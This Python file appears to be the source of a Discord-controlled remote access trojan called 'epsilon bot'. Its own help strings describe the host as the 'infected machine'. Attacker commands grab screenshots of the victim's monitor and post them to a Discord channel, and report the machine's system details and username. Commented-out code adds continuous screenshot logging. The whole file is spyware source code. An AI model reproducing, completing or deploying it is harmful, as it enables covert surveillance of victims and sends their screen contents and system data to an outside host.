from discord.ext import commands as c_bot
from discord import Game
import asyncio
from payloads.satelite import collectimage
import os
import platform
import sys
import threading
import discord

bot_token = ""

machine_data = platform.uname()

def init_bot(token):
    global bot_token
    bot_token = token

e_bot = c_bot.Bot(command_prefix='$')
f_imglog = False
interval_imglog = 6 # seconds
"""def startimglog():
    if f_imglog:

        if collectimage():
            await e_bot.send_file(message.channel,path+'tempic.png')
        threading.Timer(interval_imglog,startimglog)
    else:
        pass
"""
@e_bot.event
async def on_ready():
    await e_bot.change_presence(game=Game(name=machine_data[1]))
    
    
@e_bot.command(name = 'getpic',pass_context = True,help="grabs a screen shot from infected machine's monitor")
async def getpic(ctx):    
    if sys.platform == "win32":
        path =  os.path.expandvars("%userprofile%") +'\\Documents\\'
    else:
        path = os.path.expanduser('~')
        
        print(path)
    
    if collectimage():
        await e_bot.send_file(ctx.message.channel,path+'tempic.png')

    else:
        await e_bot.say("[Error] : Couldn't grab pic :( ")

#elif  message.content.startswith('$startimglog'):
    #   f_imglog = True
    #  threading.Timer(interval_imglog,startimglog)
"""
elif message.content.startswith('$stopimglog'):
    f_imglog = False
"""
@e_bot.command(name = 'status',help = 'shows details about infected machine')
async def status():
    await e_bot.say("Hello i'm epsilon bot by Sreyas i'm currently speaking from infected machine " + os.getlogin())
    buffer_data_system = "```* System : " + machine_data[0] + "\n* Node : " + machine_data[1] + "\n* Release : " + machine_data[2] + "\n* Version : " + machine_data[3] + "\n* Machine : " + machine_data[4] + "\n* Processor : " + machine_data[5] + "\n* Username : " + os.getlogin() +  "```"
    await e_bot.say(buffer_data_system)
"""
@e_bot.command(name = 'help')
async def help():
    buffer_data_help = """
"""**Commands**\n
\n
* **$getpic**      - grabs pic from machine's monitor\n 
* **$help**        - this dialog\n 
* **$startimglog** - starts logging image from machine\n
* **$stopsimglog** - stops logging image from machine\n
* **$status**      - shows details regarding infected machine\n 

"""
   # await e_bot.say(buffer_data_help)


       
def runbot():
    e_bot.run(bot_token)


